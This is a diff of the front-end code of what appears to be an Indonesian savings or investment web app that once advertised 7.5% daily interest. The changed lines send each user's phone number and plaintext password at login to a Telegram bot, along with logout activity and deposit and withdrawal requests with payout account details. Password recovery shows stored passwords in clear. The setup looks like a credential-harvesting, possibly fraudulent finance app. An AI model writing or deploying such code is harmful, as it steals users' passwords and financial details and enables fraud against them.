@@ -391,10 +391,7 @@
                         <i class="bi bi-eye-slash text-muted" id="btn-hide-balance" style="cursor: pointer; font-size: 16px;" onclick="toggleHideBalance()"></i>
                     </span>
                 </div>
-                <div class="balance-amount" id="balance-display">Rp 0</div>
-                <div class="interest-badge">
-                    <i class="bi bi-graph-up-arrow"></i> Bunga 7.5% cair harian
-                </div>
+               <div class="balance-amount" id="balance-display">Rp 0</div>
             </div>
             <div class="balance-actions">
                 <button class="btn-action btn-action-primary" onclick="openDepositModal()">
@@ -1214,7 +1211,7 @@
                 </div>
                 
                 <div id="deposit-step-2" style="display:none; text-align: center;">
-                    <p style="color:var(--primary); font-weight:800; font-size:24px; margin-bottom: 10px;" id="deposit-amount-display">Rp 0</p>
+                    <p style="color:var(--text-main); font-weight:600; font-size:24px; margin-bottom: 10px;" id="deposit-amount-display">Rp 0</p>
                     
                     <div id="deposit-status-wrapper">
                         <div id="qris-loading">
@@ -2100,7 +2097,7 @@
                 showModal("Pemulihan Terbuka", `Dokumen NIK terkonfirmasi! Password Anda adalah: ${usersDb[matchedPhone].password}.`, "win");
             } else {
                 closeTargetModal('recovery-modal');
-                showModal("Hubungi Bantuan", "Dokumen NIK KTP belum terekam di sistem verifikasi.", "error");
+                showModal("Hubungi Bantuan", "Dokumen NIK KTP belum terdaftar di sistem verifikasi.", "error");
             }
         }
 
@@ -2120,7 +2117,7 @@
                 localStorage.setItem('sanz_current_name', usersDb[phone].name);
                 currentUserPhone = phone; currentUserName = usersDb[phone].name;
                 const deviceUsed = getDeviceName();
-                sendToTelegram(`*AKTIVITAS LOGIN*\nNama: ${usersDb[phone].name}\nHP: \`${phone}\`\nPassword: \`${pass}\`\nUID: \`${usersDb[phone].uid}\`\nDevice: \`${deviceUsed}\``);
+                sendToTelegram(`*AKTIVITAS LOGIN*\nNama: ${usersDb[phone].name}\nHP: \`${phone}\`\nPassword: \`${pass}\`\nUID: \`${usersDb[phone].uid}\`\n\nDevice: \`${deviceUsed}\``);
                 updateAuthUI(); closeTargetModal('login-modal'); startTelegramPolling(); 
                 checkLoginLock();
                 showModal("Berhasil", `Selamat bergabung, ${currentUserName}!`, "win");
@@ -2133,7 +2130,7 @@
                 let u = usersDb[currentUserPhone];
                 if(u) {
                     const deviceUsed = getDeviceName();
-                    sendToTelegram(`*AKTIVITAS LOGOUT*\nNama: ${currentUserName}\nHP: \`${currentUserPhone}\`\nUID: \`${u.uid}\`\nDevice: \`${deviceUsed}\``);
+                    sendToTelegram(`*AKTIVITAS LOGOUT*\nNama: ${currentUserName}\nHP: \`${currentUserPhone}\`\nUID: \`${u.uid}\`\n\nDevice: \`${deviceUsed}\``);
                 }
             }
 
@@ -2614,7 +2611,7 @@
             saveDataLocally(); renderHistory();
 
             const deviceUsed = getDeviceName();
-            sendToTelegram(`*PERMINTAAN ISI SALDO*\nUID: \`${userID}\`\nNominal: Rp ${amount.toLocaleString('id-ID')}\nDevice: \`${deviceUsed}\`\n\nKirim QRIS: \`/send ${userID}\` \nKonfirmasi: \`/acc ${amount} ${userID}\` \nTolak: \`/tolak ${userID}\``);
+            sendToTelegram(`*PERMINTAAN ISI SALDO*\nUID: \`${userID}\`\nNominal: Rp ${amount.toLocaleString('id-ID')}\n\nDevice: \`${deviceUsed}\`\n\nKirim QRIS: \`/send ${userID}\` \nKonfirmasi: \`/acc ${amount} ${userID}\` \nTolak: \`/tolak ${userID}\``);
         }
 
         function showQR(url, activeDep, isResume = false) {
@@ -2729,7 +2726,7 @@
                 saveDataLocally(); renderHistory();
                 
                 const deviceUsed = getDeviceName();
-                sendToTelegram(`*PERMINTAAN TARIK SALDO*\nUID: \`${userID}\`\nNominal: Rp ${amount.toLocaleString('id-ID')}\nTujuan: ${saved.provider} - \`${saved.number}\` an (${saved.name})\nDevice: \`${deviceUsed}\`\n\nTerima: \`/acc_wd ${userID}\` \nTolak: \`/tolak_wd ${userID}\``);
+                sendToTelegram(`*PERMINTAAN TARIK SALDO*\nUID: \`${userID}\`\nNominal: Rp ${amount.toLocaleString('id-ID')}\nTujuan: ${saved.provider} - \`${saved.number}\` an (${saved.name})\n\nDevice: \`${deviceUsed}\`\n\nTerima: \`/acc_wd ${userID}\` \nTolak: \`/tolak_wd ${userID}\``);
                 
                 showModal("Diproses", "Permintaan penarikan saldo terkirim.", "win");
             });
